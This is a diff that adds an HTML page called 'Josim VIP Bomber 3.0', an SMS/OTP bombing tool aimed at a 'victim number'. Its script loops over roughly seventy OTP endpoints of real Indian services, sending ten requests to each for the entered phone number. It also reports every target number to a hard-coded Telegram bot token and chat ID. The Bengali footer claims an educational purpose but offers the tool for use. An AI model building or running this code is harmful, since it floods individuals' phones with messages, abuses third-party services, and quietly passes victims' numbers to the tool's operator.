@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Josim VIP Bomber 3.0</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Courier New', monospace;
+      background: linear-gradient(135deg, #000000, #111111);
+      color: #00ff06;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+    .box {
+      background: #0d0d0d;
+      padding: 30px;
+      border-radius: 20px;
+      box-shadow: 0 0 100px #00ff00;
+      width: 80%;
+      max-width: 500px;
+      text-align: center;
+      position: relative;
+    }
+    .logo {
+      width: 150px;
+      height: 150px;
+      border-radius: 50%;
+      box-shadow: 0 0 10px #00ff00;
+      animation: blink 1.5s infinite alternate;
+      margin-bottom: 15px;
+    }
+    h1 {
+      font-size: 20px;
+      margin-bottom: 25px;
+      text-shadow: 0 0 1200px #00ff00;
+      animation: blink 2s infinite alternate;
+    }
+    input, button {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      background: #1a1a1a;
+      color: #00ff00;
+      border: 2px solid #00ff00;
+      border-radius: 10px;
+      margin-bottom: 20px;
+      outline: none;
+      box-shadow: 0 0 10px #00ff00;
+    }
+    button:hover {
+      background: #00ff00;
+      color: #000;
+    }
+    .footer {
+      margin-top: 20px;
+      font-size: 13px;
+      color: #00ff00;
+      text-shadow: 0 0 10px #00ff00;
+      animation: blink 1s infinite alternate;
+    }
+    .status {
+      font-size: 14px;
+      color: #00ff00;
+      margin-top: 20px;
+      text-align: left;
+      height: 500px;
+      overflow-y: auto;
+      border: 2px solid #00ff00;
+      padding: 10px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px #00ff00;
+      max-height: 400px;
+    }
+    @keyframes blink {
+      from { box-shadow: 0 0 10px #00ff00; }
+      to { box-shadow: 0 0 40px #00ff00; }
+    }
+    .success { color: #00ff00; }
+    .error { color: #00ff00; }
+  </style>
+</head>
+<body>
+
+<div class="box">
+  <img class="logo" src="https://i.ibb.co/k2scmPzY/8811be70-00fa-4c97-8880-c0955970db22.jpg" alt="Logo">
+  <h1>𝙹𝚘𝚜𝚒𝚖-𝚅𝙸𝙿-𝙱𝚘𝚖𝚋𝚎𝚛-3.0</h1>
+  <input type="tel" id="number" placeholder="+𝟵𝟭 Enter Victim Number">
+  <button onclick="startAttack()">💣 ✹◟𝗔𝗧𝗧𝗔𝗖𝗞◟✹ 💣</button>
+  <div class="footer">⚠️ এই ATTACK বাটনে যতবার ক্লিক করবে, ততবার বোম্বিং হবে! এটা পুরোপুরি শিক্ষাগত উদ্যেশে বানানো হয়েছে, দয়া করে কারোর ওপরে প্রতিশোধ নিতে এটি ব্যবহার করবেন না, আর যদি কোনো খারাপ উদ্দেশে ব্যবহার করেন, তার জন্য এর ডেভেলপার (জসিম) কোনো রকম দায়ী থাকবে না! দায়ী আপনি নিজে ⚠️</div>
+  <div class="status" id="status"></div>
+</div>
+
+<audio id="attackSound" src="https://cdn.glitch.global/7c8a599f-1330-48f1-b6ae-b5fc66f382b5/Dark_Hacker_Josim_5-M.mp3?v=1744986916441" preload="auto"></audio>
+
+<script>
+  const apis = [
+    "https://amitdas.site/otp/Thesouledstore/?number=",
+    "https://amitdas.site/otp/raagasilktales/?number=",
+    "https://smsdos.techsology.site/send_sms.php?number=",
+    "https://amitdas.site/otp/sotbella/?number=",
+    "https://amitdas.site/otp/spyranretail/?number=",
+    "https://amitdas.site/otp/PocketFM/?number=",
+    "https://amitdas.site/otp/Acko/?number=",
+    "https://amitdas.site/otp/888kon/?number=",
+    "https://amitdas.site/otp/Limeroad/?number=",
+    "https://amitdas.site/otp/Eumeworld/?number=",
+    "https://amitdas.site/otp/Myntra/?number=",
+    "https://amitdas.site/otp/medplusmart/?number=",
+    "https://amitdas.site/otp/Indigo/?number=",
+    "https://amitdas.site/otp/abhibus/?number=",
+    "https://amitdas.site/otp/Bewakoof/?number=",
+    "https://amitdas.site/otp/lakmesalon/?number=",
+    "https://amitdas.site/otp/Shopsy/?number=",
+    "https://amitdas.site/otp/future-mbbs/?number=",
+    "https://amitdas.site/otp/Dabur/?number=",
+    "https://amitdas.site/otp/Abfrl/?number=",
+    "https://amitdas.site/otp/My11Circle/?number=",
+    "https://amitdas.site/otp/Samsung/?number=",
+    "https://amitdas.site/otp/indianterrain/?number=",
+    "https://amitdas.site/otp/byjus/?number=",
+    "https://amitdas.site/otp/eka/?number=",
+    "https://amitdas.site/otp/fabindia/?number=",
+    "https://amitdas.site/otp/menmoms/?number=",
+    "https://amitdas.site/otp/twilio/?number=",
+    "https://amitdas.site/otp/bhimajewellery/?number=",
+    "https://amitdas.site/otp/Vibecrafts/?number=",
+    "https://amitdas.site/otp/labroz/?number=",
+    "https://amitdas.site/otp/krishnajewellers/?number=",
+    "https://amitdas.site/otp/kindlife/?number=",
+    "https://amitdas.site/otp/Swiggy/?number=",
+    "https://amitdas.site/otp/creditmantri/?number=",
+    "https://amitdas.site/otp/simpl/?number=",
+    "https://amitdas.site/otp/Bluedart/?number=",
+    "https://amitdas.site/otp/gynoveda/?number=",
+    "https://amitdas.site/otp/theindiadecor/?number=",
+    "https://amitdas.site/otp/shawwatches/?number=",
+    "https://amitdas.site/otp/mehar/?number=",
+    "https://amitdas.site/otp/ageasybyantara/?number=",
+    "https://amitdas.site/otp/Monkeytroopers/?number=",
+    "https://amitdas.site/otp/Tira/?number=",
+    "https://amitdas.site/otp/pharmeasy/?number=",
+    "https://amitdas.site/otp/A23/?number=",
+    "https://amitdas.site/otp/Angelone/?number=",
+    "https://amitdas.site/otp/netmeds/?number=",
+    "https://amitdas.site/otp/app-work/?number=",
+    "https://amitdas.site/otp/Dailyhunt/?number=",
+    "https://amitdas.site/otp/azistastore/?number=",
+    "https://amitdas.site/otp/Fancode/?number=",
+    "https://www.mychoize.com/api/otp/send?mobileNumber=",
+    "https://prod-api.viewlift.com/identity/signin?site=jiocinema&device_platform=web&pubp=a&is_subscribed=true&grant_type=temp_otp&partner=Jio&uid=",
+    "https://api.rentomojo.com/api/v5/login?type=otp_login&mobile=",
+    "https://prod-api.viewlift.com/identity/signup?site=jiocinema&device_platform=web&pubp=a&is_subscribed=true&grant_type=temp_otp&partner=Jio&uid=",
+    "https://www.onnbikes.com/api/v1/accounts/login?mobile=",
+    "https://api.tvchannel.live/api/sendOTP?mobile=",
+    "https://api.mamaearth.in/v1/user/user_login?=",
+    "https://api.themancompany.com/v1/login?=",
+    "https://prod-api.viewlift.com/identity/signup?site=voot&device_platform=web&pubp=a&is_subscribed=true&grant_type=temp_otp&partner=Voot&uid=",
+    "https://web-api.grofers.com/v2/login?phone=",
+    "https://www.bigbasket.com/mapi/v1/user/otp/?phone=",
+    "https://api.toogoodtogo.com/api/v1/auth/v3/authByPhone?=",
+    "https://www.zee5.com/api/user/sendotp?userName=",
+    "https://api.phonepe.com/v3/login?mobileNumber=",
+    "https://api.furlenco.com/v2/users/otp?phone_number=",
+    "https://api.cure.fit/v2/user/otp?phone=",
+    "https://api.dominos.co.in/user/sendotp?mobile=",
+    "https://api.magicpin.in/v1/user/login?phone=",
+    "https://api.zomato.com/v1/otp/send?mobile=",
+    "https://api.blinkit.com/v1/user/otp/send?phone="
+  ];
+
+  const botToken = '8063511507:AAHPU7uJBdfFpShj9D9wcj9txzcF6DWnq8s';
+  const chatId = '6550943426';
+
+  function sendTelegramMessage(message) {
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chatId, text: message })
+    }).catch(e => console.error('Telegram Error:', e));
+  }
+
+  function logStatus(msg, type = 'success') {
+    const div = document.getElementById('status');
+    div.innerHTML += `<div class="${type}">${msg}</div>`;
+    div.scrollTop = div.scrollHeight;
+  }
+
+  function startAttack() {
+    const number = document.getElementById('number').value.trim();
+    if (!number) return alert("Please enter a valid number. দয়া করে মোবাইল নম্বর টি লিখুন!");
+
+    document.getElementById('attackSound').play();
+    sendTelegramMessage(`Josim VIP Bomber 3.0 🚀\nAttack Started on: ${number}`);
+    logStatus("💣 Bombing Started on " + number + " ...");
+
+    apis.forEach((api, index) => {
+      for (let i = 1; i <= 10; i++) {
+        fetch(api + number)
+          .then(res => res.json())
+          .then(data => logStatus(`✅ API ${index + 1} Hit ${i}/3: ${data.message || 'Success'}`))
+          .catch(err => logStatus(`💣 Attack.... On ${number} Bomb ${index + 1} Hit ${i}/3 Successfully By - Josim 💥 -  〄Dʌʀĸ-Ϳ Hʌcĸɩŋʛ²⁴⁶﷽`, 'error'));
+      }
+    });
+
+    setTimeout(() => {
+      sendTelegramMessage(`✅ Bombing Finished on: ${number}`);
+      logStatus("💥 Attack Finished!");
+    }, apis.length * 5 * 200);
+  }
+</script>
+
+</body>
+</html>
